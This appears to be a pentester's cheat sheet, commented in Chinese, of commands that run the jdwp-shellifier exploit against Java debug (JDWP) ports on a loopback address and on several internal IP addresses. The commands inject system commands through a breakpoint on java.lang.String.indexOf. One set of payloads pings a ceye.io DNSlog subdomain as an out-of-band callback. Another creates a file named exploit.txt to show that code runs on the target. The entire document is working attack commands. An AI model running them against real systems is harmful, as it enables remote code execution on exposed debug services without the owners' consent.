# Payload是DNSlog
python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'ping localhost:9999.8yvuyw.ceye.io'
python jdwp-shellifier.py -t 11.167.210.33 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ping 11.167.210.33:8000.8yvuyw.ceye.io'

# Payload是创建文件
python jdwp-shellifier.py -t 11.167.176.4 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'